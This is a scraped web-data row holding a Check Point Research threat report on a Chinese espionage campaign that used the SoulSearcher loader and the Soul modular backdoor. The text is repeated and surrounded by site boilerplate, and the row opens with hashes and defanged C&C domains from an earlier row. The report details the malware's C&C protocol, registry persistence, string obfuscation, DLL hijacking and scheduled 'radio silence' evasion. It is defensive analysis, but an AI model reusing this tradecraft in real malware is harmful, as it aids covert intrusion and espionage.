samplescbeaedfa84b02a2bd41a70fa92a46c366349dd85d9549f333117a84946972d062239800bfc8fdfddf78229f2eb8a7b9542bc36d5debc21dff3559870ff300c4e4c2431e5f868228c1f286fca1033d2211536ec56d69cc7e9aebb8fbd0d3277c449d1f9ce1d0f6dfa94ad9b0548384b3a83500309a878370722bc40c7b83e83e38096dfaa954113242011e0d7aaaebffdbbb464b327ad259ad5de7ce3e85a4081cdae1c55ec154cd6cef4954519564c012996a70d09fff69f209051ce75a9b4f89d9851d672293dfd8354081fd0263c1396db6240acb1a3fca8add7c4f9472aa51c49d04fc0eb8c9de9f2f6d661826d2488aba3f2d526b0ba3db9bc3dfee7db3986d28664fc7332eafb788a44ac82a5ed1da0bf901ae15a9a8aef89243516c818579f1883cdfd8534167e773341e27990495b118d11ceae029d186ffdbb157614Infrastructureozaharso[.]runubiumbi[.]ruacaenaso[.]ruatonpi[.]rusuizibel[.]rudakareypa[.]ruahmozpi[.]runebtoizi[.]rusqueamish[.]runahtizi[.]rucrisiumbi[.]ruarabianos[.]rugayado[.]ruquyenzo[.]rucredomched[.]rulestemps[.]ruurdevont[.]ruhoanzo[.]ruabsorbeni[.]ruaethionemaso[.]ruaychobanpo[.]ruayzakpo[.]rubadrupi[.]rubarakapi[.]ruboskatrem[.]rubrudimar[.]rudecorous[.]rudumerilipi[.]ruheartbreaking[.]rujudicious[.]rukaroanpa[.]rulamentable[.]ruprocellarumbi[.]ruragibpo[.]ruraidla[.]ruramizla[.]rusamiseto[.]rusuperficial[.]rutalehgi[.]ruundesirable[.]ruvalefgo[.]ruvasifgo[.]ruvilaverde[.]ruvloperang[.]ruzerodems[.]rugeminiso[.]ruvilaverde[.]rulamentable[.]ruraidla[.]ruboskatrem[.]ruheartbreaking[.]rusabirpo[.]ruvalefgo[.]ruvasifgo[.]ruabsorbeni[.]ruvloperang[.]rudecorous[.]ruramizla[.]ruprocellarumbi[.]ruandamanos[.]rutriticumos[.]ruGO UPBACK TO ALL POSTSPOPULAR POSTSArtificial IntelligenceChatGPTCheck Point Research PublicationsOPWNAI : Cybercriminals Starting to Use ChatGPTCheck Point Research PublicationsThreat ResearchHacking Fortnite AccountsArtificial IntelligenceChatGPTCheck Point Research PublicationsOpwnAI: AI That Can Save the Day or HACK it AwayBLOGS AND PUBLICATIONSCheck Point Research PublicationsGlobal Cyber Attack ReportsThreat ResearchFebruary 17, 2020“The Turkish Rat” Evolved Adwind in a Massive Ongoing Phishing CampaignCheck Point Research PublicationsAugust 11, 2017“The Next WannaCry” Vulnerability is HereCheck Point Research PublicationsJanuary 11, 2018‘RubyMiner’ Cryptominer Affects 30% of WW NetworksPublicationsGlobal cyber attack reportsResearch publicationsIPS advisoriesCheck point blogDemosToolsSandblast file analysisThreatCloudThreat IntelligenceZero day protectionLive threat mapAbout UsContact UsLet’s get in touchSubscribe for cpr blogs, news and moreSubscribe Now© 1994-2024 Check Point Software Technologies LTD. All rights reserved.Property ofCheckPoint.comPrivacy PolicySUBSCRIBE TO CYBER INTELLIGENCE REPORTSFirst NameLast NameCountry—Please choose an option—ChinaIndiaUnited StatesIndonesiaBrazilPakistanNigeriaBangladeshRussiaJapanMexicoPhilippinesVietnamEthiopiaEgyptGermanyIranTurkeyDemocratic Republic of the CongoThailandFranceUnited KingdomItalyBurmaSouth AfricaSouth KoreaColombiaSpainUkraineTanzaniaKenyaArgentinaAlgeriaPolandSudanUgandaCanadaIraqMoroccoPeruUzbekistanSaudi ArabiaMalaysiaVenezuelaNepalAfghanistanYemenNorth KoreaGhanaMozambiqueTaiwanAustraliaIvory CoastSyriaMadagascarAngolaCameroonSri LankaRomaniaBurkina FasoNigerKazakhstanNetherlandsChileMalawiEcuadorGuatemalaMaliCambodiaSenegalZambiaZimbabweChadSouth SudanBelgiumCubaTunisiaGuineaGreecePortugalRwandaCzech RepublicSomaliaHaitiBeninBurundiBoliviaHungarySwedenBelarusDominican RepublicAzerbaijanHondurasAustriaUnited Arab EmiratesIsraelSwitzerlandTajikistanBulgariaHong Kong (China)SerbiaPapua New GuineaParaguayLaosJordanEl SalvadorEritreaLibyaTogoSierra LeoneNicaraguaKyrgyzstanDenmarkFinlandSlovakiaSingaporeTurkmenistanNorwayLebanonCosta RicaCentral African RepublicIrelandGeorgiaNew ZealandRepublic of the CongoPalestineLiberiaCroatiaOmanBosnia and HerzegovinaPuerto RicoKuwaitMoldovMauritaniaPanamaUruguayArmeniaLithuaniaAlbaniaMongoliaJamaicaNamibiaLesothoQatarMacedoniaSloveniaBotswanaLatviaGambiaKosovoGuinea-BissauGabonEquatorial GuineaTrinidad and TobagoEstoniaMauritiusSwazilandBahrainTimor-LesteDjiboutiCyprusFijiReunion (France)GuyanaComorosBhutanMontenegroMacau (China)Solomon IslandsWestern SaharaLuxembourgSurinameCape VerdeMaltaGuadeloupe (France)Martinique (France)BruneiBahamasIcelandMaldivesBelizeBarbadosFrench Polynesia (France)VanuatuNew Caledonia (France)French Guiana (France)Mayotte (France)SamoaSao Tom and PrincipeSaint LuciaGuam (USA)Curacao (Netherlands)Saint Vincent and the GrenadinesKiribatiUnited States Virgin Islands (USA)GrenadaTongaAruba (Netherlands)Federated States of MicronesiaJersey (UK)SeychellesAntigua and BarbudaIsle of Man (UK)AndorraDominicaBermuda (UK)Guernsey (UK)Greenland (Denmark)Marshall IslandsAmerican Samoa (USA)Cayman Islands (UK)Saint Kitts and NevisNorthern Mariana Islands (USA)Faroe Islands (Denmark)Sint Maarten (Netherlands)Saint Martin (France)LiechtensteinMonacoSan MarinoTurks and Caicos Islands (UK)Gibraltar (UK)British Virgin Islands (UK)Aland Islands (Finland)Caribbean Netherlands (Netherlands)PalauCook Islands (NZ)Anguilla (UK)Wallis and Futuna (France)TuvaluNauruSaint Barthelemy (France)Saint Pierre and Miquelon (France)Montserrat (UK)Saint Helena, Ascension and Tristan da Cunha (UK)Svalbard and Jan Mayen (Norway)Falkland Islands (UK)Norfolk Island (Australia)Christmas Island (Australia)Niue (NZ)Tokelau (NZ)Vatican CityCocos (Keeling) Islands (Australia)Pitcairn Islands (UK)EmailWe value your privacy!BFSI uses cookies on this site. We use cookies to enable faster and easier experience for you. By continuing to visit this website you agree to our use of cookies.ACCEPTREJECT"
https://research.checkpoint.com/2023/pandas-with-a-soul-chinese-espionage-attacks-against-southeast-asian-government-entities/,"In 2021, Check Point Research published a report on a previously undisclosed toolset used bySharp Panda, a long-running Chinese cyber-espionage operation targeting Southeast Asian government entities. Since then, we have continued to track the use of these tools across several operations in multiple Southeast Asian countries, in particular nations with similar territorial claims or strategic infrastructure projects such as Vietnam, Thailand, and Indonesia. Key findings: At the beginning of 2021, Check Point Researchidentifiedan ongoing surveillance operation we named Sharp Panda that was targeting Southeast Asian government entities. The attackers used spear-phishing emails to gain initial access to the targeted networks. These emails typically contained a Word document with government-themed lures that leveraged a remote template to download and run a malicious RTF document, weaponized with the infamous RoyalRoad kit. Once inside, the malware starts a chain of in-memory loaders, comprised of a custom DLL downloader we call5.t Downloaderand a second-stage loader responsible for the delivery of a final backdoor. The final payload observed in Sharp Panda campaigns at the time wasVictoryDll,a custom and unique malware that enabled remote access and data collection from the infected device. We tracked several earlier versions of the VictoryDll backdoor back to at least 2017, with the whole operation remaining under the radar the entire time. Further tracking of Sharp Panda tools revealed multiple campaigns that targeted entities in Southeast Asian countries, such as Vietnam, Indonesia, and Thailand. During this time, multiple minor changes were implemented in the 5.t Downloader itself, but in general, the initial part of the infection chain (the use of Word documents, RoyalRoad RTF and 5.t Downloader) remained the same. However, in early 2023, when investigating an attack against one of the government entities located in the targeted region, the payload received from the actor’s geo-fenced C&C server was different from the VictoryDll backdoor observed before. Further analysis revealed that this payload is a new version ofSoulSearcherloader, which is responsible for downloading, decrypting, and loading in memory other modules of theSoul modular backdoor. The use of the Soul malware framework wasdescribedby Symantec in relation to the unattributed espionage operation targeting defense, healthcare, and ICT sectors in Southeast Asia in 2020-2021. Following up on that report, Fortinet researchers discovered other samples from 2017-2021 anddescribedthe evolution of the framework. Soul was alsoseenin 2019 in attacks against Vietnamese targets. None of these public reports attributed the Soul framework to any specific country or known actor, although researchers noted the “competent adversarial tradecraft” which they believed indicated a “possibly state-sponsored” group. In this report, we provide a detailed technical explanation of several malicious stages used in this infection chain and the latest changes implemented in the Soul framework. We also discuss the challenges in attributing these attacks. The downloader, which in this specific case was dropped by RoyalRoad RTF to the disk asres6.a, is executed by a scheduled task withrundll32.exe, StartA. Its functionality is consistent with previousresearchof Sharp Panda activity. Similar to previous Sharp Panda campaigns, the C&C servers of the attackers are geofenced and return payloads only to requests from the IP addresses of the countries where the targets are located. In the latest campaign, the actors implemented some changes in the downloader’s communication with the C&C. Previously, the entire C&C communication was based on sending data encrypted using RC4 and encoded with base64, with an exception for the HTTP request for payload which contained the hostname in plain text in the URI:/[**hostname]**.html. However, in the new samples, the payload request is issued to the same PHP path as all the previous requests, with the host specified in its parameter, both MD5-hashed and in clear-text:[host_name]*[host_name_md5], e.g.MyComputer*d2122d4f4cdf26faa1b2f73bda6030f4and then encoded: /[php_name].php?Data=[encoded<host_name_and_host_md5>] It’s noteworthy that while different keys were used, the encoding method using RC4+Base64 remained consistent in all cases. In addition to changes in the URL patterns, the actors refrained from using the distinctive User-Agent“Microsoft Internet Explorer”and instead used a hardcoded generic one. A few of the samples we observed also communicated through HTTPS, not HTTP. Unlike the previous version where only the API calls were obfuscated, the new version also uses string encryption. However, the encryption is quite simple and consists of loop XORing an encrypted character with the difference of a loop index and a constant value: As in previous versions, the downloader gathers data from the victim’s computer including hostname, OS name and version, system type (32/64 bit), username, MAC addresses of the networking adapters, and information on anti-virus solutions. If the threat actors find the victim’s machine to be a promising target, the response from the server contains the next stage executable in encrypted form and its MD5 checksum. After verifying the integrity of the received message, the downloader loads the decrypted DLL to memory and starts its execution from theStartWexport function (the same name as the next stage loader export in previous campaigns that used the downloader). SoulSearcher is a second-stage loader, which according to Fortinetresearchwas seen in the wild since at least November 2018 and is responsible for executing the Soul backdoor main module and parsing its configuration. SoulSearcher has multiple variants based on where the configuration and payload are located and on the type of configuration. Among the samples used in the more recent activity cluster we have been researching, the SoulSearcher DLL (sha256: d1a6c383de655f96e53812ee1dec87dd51992c4be28471e44d7dd558585312e0) was slightly different from any previously discovered samples, with the backdoor embedded inside the data section and the embedded configuration in XML format. The malware checks if it runs under a process namedsvchost.exe,msdtc.exeorspoolsv.exe. If it does, it starts a thread onStartWexport and continues loading the backdoor. This might be an indication of the loader being used in different infection chains than we observed in this attack with the rundll32.exe directly starting a chain of in-memory DLL loaders fromStartW. The payload loading process starts with obtaining the configuration. While previously seen XML SoulSearchers retrieved this from the registry, a file mapping object, or a file on the disk, the newest version loads the config from a hardcoded Base64 string and stores it in the registry pathHKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\CONFIGEX. The decoded data blob can be represented with the following struct: The loader contains a compressed Soul backdoor DLL in the data section of the loader, while previous samples stored it in the overlay. Next, based on the system architecture, SoulSearcher appends32or64to the wide stringL'ServerBase', hashes the resulting string with MD5, and creates the registry key with this hash:HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\Assemblies\[ServerBaseArch_md5]. The value contains the compressed payload. If the registry key is successfully created, the loader reads the compressed payload and proceeds to decrypt and load it in memory. The loading process itself is not different from previously discussed variants of SoulSearcher: it uses thecompressed_datastructure from the configuration to validate MD5 checksums, LZMA-decompress the compressed module, and reflectively load the Soul main module DLL in memory. After loading the backdoor, Soul Searcher resolves theConstructexport of the backdoor and calls it with the arguments[ServerBaseArch_md5] -Startup. The Soul main module is responsible for communicating with the C&C server and its primary purpose is to receive and load in memory additional modules. Interestingly, the backdoor configuration contains a “radio silence”-like feature, where the actors can specify specific hours in a week when the backdoor is not allowed to communicate with the C&C server. The recovered sample of the backdoor is quite different from the samples that were previously analyzed. The new version of SoulBackdoor was compiled on29/11/2022 02:12:34 UTC. Based on their timestamps, the earlier samples analyzed by other researchers are mostly from 2017 with the exception of one from 2018, which, similar to our case, was embedded inside the SoulSearcher loader. The backdoor implements a custom C&C protocol, which is entirely different than previously observed versions. Both the old and new versions are based on HTTP communication, but the latest version seems to be more complex and uses various HTTP request methods such asGET,POST, andDELETE. The API endpoints are also different, and the C&C requests contain additional HTTP request headers. In terms of the backdoor functionality, the enumeration data is different from the previous versions and is more extensive. The supported C&C commands, with the newer variant primarily focused on loading additional modules, lack any type of common backdoor functionality like manipulating local files, sending files to the C&C, and executing remote commands. The backdoor requires two arguments or the“-v”argument before performing its activity. As we mentioned earlier, in our case it is executed by SoulSearcher with[ServerBaseArch_md5] -Startuparguments. Soul backdoor first creates an event using the hardcoded nameGlobal\3GS7JR4Sand checks the registry keyHKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF. It then uses the same configuration (from the registry keyHKEY_CURRENT_USER\SOFTWARE\Software\Microsoft\CTF\CONFIGEX) with thecompressed_datastruct (as used by SoulSearcher) to extract the payload and decompress its own configuration. The configuration of the main module provides the parameters of C&C communication and other aspects of the backdoor execution. The compression algorithm is LZMA, similar to that found in older variants. After decompression, the config looks like this: In its base (<BASE>) settings, the configuration contains the parameter “LstPort”. In the previous versions, this provided the backdoor the ability to listen on a specified port. In this version, the code that supported this feature was removed, and the backdoor can only actively connect to the C&C server using the URL provided in the “IP” parameter on the “connect” port “Cnt”. In the “advanced” section (<ADV>) of the configuration, the “OlTime” parameter contains a list of 168 (24×7) numbers, one per hour in a week. Each hour is represented either by 0 or 1. Zero means a “blocked” hour, and one represents an “allowed” hour. This way the operators of the malware can use the configuration to enforce the specific hours the backdoor is allowed to communicate with the C&C server. If theOlTimefield is empty in the config, a default setting is for all days and hours to be configured as “allowed”. This is an advanced OpSec feature that allows the actors to blend their communication flow into general traffic and decrease the chances of network communication being detected. The “service” (<SVC>) section defines the parameters for the backdoor to be installed as a service: The Symantec publication also mentioned the Soul Searcher running as a service, but in the sample we analyzed, there is no code that implements this feature. Judging by the settings left in the configuration we observed, the actors performed some variation ofIKEEXT DLL Hijacking, when on the start of the IKEEXT service,svchost.exewould load the malicious DLL, saved aswlbsctrl.dll. After loading and parsing the configuration the backdoor checks the registryHKEY_CURRENT_USER\SOFTWARE\Software\Microsoft\CTF\Assembliesfor the existence of a key with the name of MD5 hash of the wide stringL""AutoRun"". If it exists, the backdoor decompresses, loads in memory, and executes theConstructexport of the DLL stored in this key. Although we didn’t witness the creation or usage of this additional DLL payload, this logic is likely used for auto-updates or executing specific actions prior to the main backdoor activity. After all of these steps are concluded, the backdoor begins the execution of its main thread. The main thread begins by validating that it received from the configuration the C&C URL and DNS (or blog URL, which is empty in our case), and that the C&C URL starts withhttp://,https://orftp://. In this specific sample, we did not observe any type of FTP communication capabilities. Then, if the current hour is “allowed” byOlTimeconfiguration, it begins the C&C communication. Bot registration and victim fingerprinting The first request is sent to the specified URL with theClientHelloparameter. The MD5 header is an MD5 hash of the body. As there is no data transferred by this request, the MD5 (d41d8cd98f00b204e9800998ecf8427e) is of an empty string. In further analysis of the requests, we omit the common headers (Cache-Control, Connection, User-Agent, MD5 and Host) as their meaning doesn’t change between the requests. The expected response from the C&C server isERR! ParamError!In case of a bad or no response, the backdoor attempts to resolve the IP address of the C&C server on its own through the DNS servers in the config. If the response is correct, it saves the C&C IP address in this format:SVR:[IP_field_from_config]:[CntPort]to the registry keyHKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\SVIF. Next, the module performs a full system enumeration and collects the following data: After the system enumeration, the backdoor generates abotUUID, concatenating with “-” two MD5 strings based on various parameters from the enumerated data. It saves thebotUUIDto the registry keyHKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\UUID. The resultingbotUUIDlooks like this: 5d41402abc4b2a76b9719d911017c592-7d793037a0760186574b0282f2f435e7 and is used in all the following network requests. New C&C connection After the system enumeration, the backdoor issues a series of requests to “register” a new connection and perform validation against the C&C server. First, the backdoor notifies the server of a new connection. It is implemented as a DELETE request with the botUUID: The accepted response from the C&C:OK! Next, theConnectrequest is sent, whose body contained Base64 of the stringConnectXXXXXXXX, whereXXXXXXXXis the connection timestamp retrieved byGetTickCount()API. The accepted response from the C&C:OK! The following request prepares the server to receive the enumeration data from the victim’s machine: The accepted response from the C&C is a string that looks like this:./Updata/[botUUID]_[connection_timestamp].txt. This is most likely the path on the server to store the enumeration data. After this the backdoor sends another network request, possibly for verification: The accepted response is a base64-encoded string that contains the botUUID. At the end of this process, if all the requests are successful, the backdoor is “registered” at the C&C server and continues sending information about the system. Send enumerated data From this point on, the data sent between the backdoor and the C&C server relies on another struct,c2_body: const_float, where used, is a hardcoded value, 5.2509999.special_flagandadditional_dataseem to be multipurpose variables that have different meanings in different contexts of the program execution. When sent in the body of both requests and responses, this struct is compressed according to the previously describedcompressed_datastruct from SoulSearcher, and then encoded with Base64. First, the backdoor sends the current timestamp in the request to the following URL (a new timestamp is again retrieved byGetTickCount()API). In this request,special_flagis 0x00,command_idis 0x01 andadditonal_datais the tick count. The accepted response isOK!Otherwise, the backdoor sleeps and starts the connection from the beginning. Next, the backdoor collects the enumeration data again, and compresses it using another struct: The struct is then encoded with Base64 and sent in the body of the following request (the URL and methods are the same): Thecommand_idis the same 0x01,special_flag=0,additional_data= 0x4000 + 0x49 = size of enum data. The accepted response is alsoOK! Main C&C loop After posting the enumeration data, the backdoor enters an infinite loop, contacting the C&C server with the following request to receive the commands: If there is no C&C command for the victim, the server responds withERR! Path not found, WAIT! If there is a command to execute, the C&C returns it in a base64-encoded string which is decompressed withcompressed_dataand parsed asc2_body. Then thecommand_idfrom the struct is translated to the actual command execution. The main commands that can be received from the C&C server are control messages for the bot: If in thec2_bodythespecial_flagis set to one, the backdoor starts a continuous loop requesting data from the C&C server. The server should respond with a module name to be loaded from theComputer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\CTF\Assembliesregistry key, which is executed from itsConstructexport. Then the backdoor proceeds to execute the command specified incommand_id. If the command_id is0x04, the backdoor spawns a new “command execution” thread that performs a similar network communication flow as the main thread, only without sending the enumeration data. It then begins handling the following commands: All the received modules are stored compressed in the registry. The decompression is performed according to another struct: We didn’t witness any follow-up modules, but due to the modular nature of the backdoor, we can expect the actors to use all kinds of data-stealing modules, keyloggers, data exfiltration modules and likely also a lateral movement toolset. As the first stages of the infection chain are identical to the previously described Sharp Panda activity, many of the indicators that allowed us to attribute the threat actors to Chinese-based threat groups are still relevant in relation to the subsequent attack attempts described in this report: In addition, the Soul Backdoor configuration contains 2 hardcoded DNS services, one of which is a Chinese114DNSFree Public DNS service which is not commonly used outside the region. The campaign discussed in this report involves the malicious artifacts from different clusters of malware activity. As sharing custom tools or operational methods is common among Chinese-based threat actors to facilitate intrusion efforts, it poses a challenge to their attribution. In addition to observing different toolsets from two previously not connected clusters (Sharp Panda and previous attacks using the Soul framework), other areas of overlap between publicly tracked Chinese APT groups and this campaign include the following: The vague links of all the aforementioned groups to Chinese intelligence Services, the nature of the targets, and the capabilities of the toolset used lead us to the conclusion that the described activity is an espionage operation likely executed by well-resourced and possibly nation-state threat actors. In this report, we analyzed the TTPs and the tools used in the espionage campaign against Southeast Asian government entities. The initial infection stages of this campaign use TTPs and tools consistent with Sharp Panda activity first discovered in 2021. We continue to track Sharp Panda as a separate unknown cluster, and based on our current insight into this threat, we cannot confirm with high confidence their relation to other Chinese threat actors. The later stages of the infection chain in the described campaign are based on Soul, a previously unattributed modular malware framework. While the Soul framework has been in use since at least 2017, the threat actors behind it have been constantly updating and refining its architecture and capabilities. Based on the technical findings presented in our research, we believe this campaign is staged by advanced Chinese-backed threat actors, whose other tools, capabilities, and position within the broader network of espionage activities are yet to be explored. Phishing documents External template (RoyalRoad RTF) 5.t Downloader SoulSearcher Soul Backdoor Subscribe for cpr blogs, news and more Subscribe Now © 1994-2024 Check Point Software Technologies LTD. All rights reserved. Property ofCheckPoint.com Privacy Policy  First Name Last Name Country—Please choose an option—ChinaIndiaUnited StatesIndonesiaBrazilPakistanNigeriaBangladeshRussiaJapanMexicoPhilippinesVietnamEthiopiaEgyptGermanyIranTurkeyDemocratic Republic of the CongoThailandFranceUnited KingdomItalyBurmaSouth AfricaSouth KoreaColombiaSpainUkraineTanzaniaKenyaArgentinaAlgeriaPolandSudanUgandaCanadaIraqMoroccoPeruUzbekistanSaudi ArabiaMalaysiaVenezuelaNepalAfghanistanYemenNorth KoreaGhanaMozambiqueTaiwanAustraliaIvory CoastSyriaMadagascarAngolaCameroonSri LankaRomaniaBurkina FasoNigerKazakhstanNetherlandsChileMalawiEcuadorGuatemalaMaliCambodiaSenegalZambiaZimbabweChadSouth SudanBelgiumCubaTunisiaGuineaGreecePortugalRwandaCzech RepublicSomaliaHaitiBeninBurundiBoliviaHungarySwedenBelarusDominican RepublicAzerbaijanHondurasAustriaUnited Arab EmiratesIsraelSwitzerlandTajikistanBulgariaHong Kong (China)SerbiaPapua New GuineaParaguayLaosJordanEl SalvadorEritreaLibyaTogoSierra LeoneNicaraguaKyrgyzstanDenmarkFinlandSlovakiaSingaporeTurkmenistanNorwayLebanonCosta RicaCentral African RepublicIrelandGeorgiaNew ZealandRepublic of the CongoPalestineLiberiaCroatiaOmanBosnia and HerzegovinaPuerto RicoKuwaitMoldovMauritaniaPanamaUruguayArmeniaLithuaniaAlbaniaMongoliaJamaicaNamibiaLesothoQatarMacedoniaSloveniaBotswanaLatviaGambiaKosovoGuinea-BissauGabonEquatorial GuineaTrinidad and TobagoEstoniaMauritiusSwazilandBahrainTimor-LesteDjiboutiCyprusFijiReunion (France)GuyanaComorosBhutanMontenegroMacau (China)Solomon IslandsWestern SaharaLuxembourgSurinameCape VerdeMaltaGuadeloupe (France)Martinique (France)BruneiBahamasIcelandMaldivesBelizeBarbadosFrench Polynesia (France)VanuatuNew Caledonia (France)French Guiana (France)Mayotte (France)SamoaSao Tom and PrincipeSaint LuciaGuam (USA)Curacao (Netherlands)Saint Vincent and the GrenadinesKiribatiUnited States Virgin Islands (USA)GrenadaTongaAruba (Netherlands)Federated States of MicronesiaJersey (UK)SeychellesAntigua and BarbudaIsle of Man (UK)AndorraDominicaBermuda (UK)Guernsey (UK)Greenland (Denmark)Marshall IslandsAmerican Samoa (USA)Cayman Islands (UK)Saint Kitts and NevisNorthern Mariana Islands (USA)Faroe Islands (Denmark)Sint Maarten (Netherlands)Saint Martin (France)LiechtensteinMonacoSan MarinoTurks and Caicos Islands (UK)Gibraltar (UK)British Virgin Islands (UK)Aland Islands (Finland)Caribbean Netherlands (Netherlands)PalauCook Islands (NZ)Anguilla (UK)Wallis and Futuna (France)TuvaluNauruSaint Barthelemy (France)Saint Pierre and Miquelon (France)Montserrat (UK)Saint Helena, Ascension and Tristan da Cunha (UK)Svalbard and Jan Mayen (Norway)Falkland Islands (UK)Norfolk Island (Australia)Christmas Island (Australia)Niue (NZ)Tokelau (NZ)Vatican CityCocos (Keeling) Islands (Australia)Pitcairn Islands (UK) Email  BFSI uses cookies on this site. We use cookies to enable faster and easier experience for you. By continuing to visit this website you agree to our use of cookies.","    23 4 3 383 1 43 2 1 0 22 316 12 1 1 1 0 172 9 0 February 17, 2020 August 11, 2017 January 11, 2018    —Please choose an option—ChinaIndiaUnited StatesIndonesiaBrazilPakistanNigeriaBangladeshRussiaJapanMexicoPhilippinesVietnamEthiopiaEgyptGermanyIranTurkeyDemocratic Republic of the CongoThailandFranceUnited KingdomItalyBurmaSouth AfricaSouth KoreaColombiaSpainUkraineTanzaniaKenyaArgentinaAlgeriaPolandSudanUgandaCanadaIraqMoroccoPeruUzbekistanSaudi ArabiaMalaysiaVenezuelaNepalAfghanistanYemenNorth KoreaGhanaMozambiqueTaiwanAustraliaIvory CoastSyriaMadagascarAngolaCameroonSri LankaRomaniaBurkina FasoNigerKazakhstanNetherlandsChileMalawiEcuadorGuatemalaMaliCambodiaSenegalZambiaZimbabweChadSouth SudanBelgiumCubaTunisiaGuineaGreecePortugalRwandaCzech RepublicSomaliaHaitiBeninBurundiBoliviaHungarySwedenBelarusDominican RepublicAzerbaijanHondurasAustriaUnited Arab EmiratesIsraelSwitzerlandTajikistanBulgariaHong Kong (China)SerbiaPapua New GuineaParaguayLaosJordanEl SalvadorEritreaLibyaTogoSierra LeoneNicaraguaKyrgyzstanDenmarkFinlandSlovakiaSingaporeTurkmenistanNorwayLebanonCosta RicaCentral African RepublicIrelandGeorgiaNew ZealandRepublic of the CongoPalestineLiberiaCroatiaOmanBosnia and HerzegovinaPuerto RicoKuwaitMoldovMauritaniaPanamaUruguayArmeniaLithuaniaAlbaniaMongoliaJamaicaNamibiaLesothoQatarMacedoniaSloveniaBotswanaLatviaGambiaKosovoGuinea-BissauGabonEquatorial GuineaTrinidad and TobagoEstoniaMauritiusSwazilandBahrainTimor-LesteDjiboutiCyprusFijiReunion (France)GuyanaComorosBhutanMontenegroMacau (China)Solomon IslandsWestern SaharaLuxembourgSurinameCape VerdeMaltaGuadeloupe (France)Martinique (France)BruneiBahamasIcelandMaldivesBelizeBarbadosFrench Polynesia (France)VanuatuNew Caledonia (France)French Guiana (France)Mayotte (France)SamoaSao Tom and PrincipeSaint LuciaGuam (USA)Curacao (Netherlands)Saint Vincent and the GrenadinesKiribatiUnited States Virgin Islands (USA)GrenadaTongaAruba (Netherlands)Federated States of MicronesiaJersey (UK)SeychellesAntigua and BarbudaIsle of Man (UK)AndorraDominicaBermuda (UK)Guernsey (UK)Greenland (Denmark)Marshall IslandsAmerican Samoa (USA)Cayman Islands (UK)Saint Kitts and NevisNorthern Mariana Islands (USA)Faroe Islands (Denmark)Sint Maarten (Netherlands)Saint Martin (France)LiechtensteinMonacoSan MarinoTurks and Caicos Islands (UK)Gibraltar (UK)British Virgin Islands (UK)Aland Islands (Finland)Caribbean Netherlands (Netherlands)PalauCook Islands (NZ)Anguilla (UK)Wallis and Futuna (France)TuvaluNauruSaint Barthelemy (France)Saint Pierre and Miquelon (France)Montserrat (UK)Saint Helena, Ascension and Tristan da Cunha (UK)Svalbard and Jan Mayen (Norway)Falkland Islands (UK)Norfolk Island (Australia)Christmas Island (Australia)Niue (NZ)Tokelau (NZ)Vatican CityCocos (Keeling) Islands (Australia)Pitcairn Islands (UK) ","Pandas with a Soul: Chinese Espionage Attacks Against Southeast Asian Government Entities - Check Point ResearchCONTACT USDISCLOSURE POLICYCHECKPOINT.COMUNDER ATTACK?Latest PublicationsCPR Podcast ChannelWeb 3.0 SecurityIntelligence ReportsResourcesThreatCloud AIThreat Intelligence & ResearchZero Day ProtectionSandblast File AnalysisAbout UsSUBSCRIBESUBSCRIBECATEGORIESAndroid Malware23Artificial Intelligence4ChatGPT3Check Point Research Publications383Cloud Security1CPRadio43Crypto2Data & Threat Intelligence1Data Analysis0Demos22Global Cyber Attack Reports316How To Guides12Ransomware1Russo-Ukrainian War1Security Report1Threat and data analysis0Threat Research172Web 3.0 Security9Wipers0Pandas with a Soul: Chinese Espionage Attacks Against Southeast Asian Government EntitiesMarch 7, 2023https://research.checkpoint.com/2023/pandas-with-a-soul-chinese-espionage-attacks-against-southeast-asian-government-entities/Executive summaryIn 2021, Check Point Research published a report on a previously undisclosed toolset used bySharp Panda, a long-running Chinese cyber-espionage operation targeting Southeast Asian government entities. Since then, we have continued to track the use of these tools across several operations in multiple Southeast Asian countries, in particular nations with similar territorial claims or strategic infrastructure projects such as Vietnam, Thailand, and Indonesia.Key findings:In late 2022, a campaign with an initial infection vector similar to previous Sharp Panda operations targeted a high-profilegovernment entityin the region.While Sharp Panda’s previous campaigns delivered a custom and unique backdoor called VictoryDll, the payload in this specific attack is a new version ofSoulSearcher loader,which eventually loadsthe Soul modular framework.Although samples of this framework from 2017-2021 were previouslyanalyzed, this report is the most extensive look yet at the Soul malware family infection chain, including a full technical analysis of the latest version, compiled in late 2022.Although the Soul malware framework was previouslyseenin an espionage campaign targeting the defense, healthcare, and ICT sectors in Southeast Asia, it was never previously attributed or connected to any known cluster of malicious activity. Although it is currently not clear if the Soul framework is utilized by a single threat actor, based on our research we can attribute the framework to an APT group with Chinese origins.The connection between the tools and TTPs (Tactics, Techniques and Procedures) of Sharp Panda and the previously mentioned attacks in Southeast Asia might serve as yet another example of key characteristics inherent to Chinese-based APT operations, such as sharing custom tools between groups or task specialization, when one entity is responsible for the initial infection and another one performs the actual intelligence gathering.IntroductionAt the beginning of 2021, Check Point Researchidentifiedan ongoing surveillance operation we named Sharp Panda that was targeting Southeast Asian government entities. The attackers used spear-phishing emails to gain initial access to the targeted networks. These emails typically contained a Word document with government-themed lures that leveraged a remote template to download and run a malicious RTF document, weaponized with the infamous RoyalRoad kit. Once inside, the malware starts a chain of in-memory loaders, comprised of a custom DLL downloader we call5.t Downloaderand a second-stage loader responsible for the delivery of a final backdoor. The final payload observed in Sharp Panda campaigns at the time wasVictoryDll,a custom and unique malware that enabled remote access and data collection from the infected device. We tracked several earlier versions of the VictoryDll backdoor back to at least 2017, with the whole operation remaining under the radar the entire time.Further tracking of Sharp Panda tools revealed multiple campaigns that targeted entities in Southeast Asian countries, such as Vietnam, Indonesia, and Thailand. During this time, multiple minor changes were implemented in the 5.t Downloader itself, but in general, the initial part of the infection chain (the use of Word documents, RoyalRoad RTF and 5.t Downloader) remained the same. However, in early 2023, when investigating an attack against one of the government entities located in the targeted region, the payload received from the actor’s geo-fenced C&C server was different from the VictoryDll backdoor observed before. Further analysis revealed that this payload is a new version ofSoulSearcherloader, which is responsible for downloading, decrypting, and loading in memory other modules of theSoul modular backdoor.Figure 1 – The infection chain.The use of the Soul malware framework wasdescribedby Symantec in relation to the unattributed espionage operation targeting defense, healthcare, and ICT sectors in Southeast Asia in 2020-2021. Following up on that report, Fortinet researchers discovered other samples from 2017-2021 anddescribedthe evolution of the framework. Soul was alsoseenin 2019 in attacks against 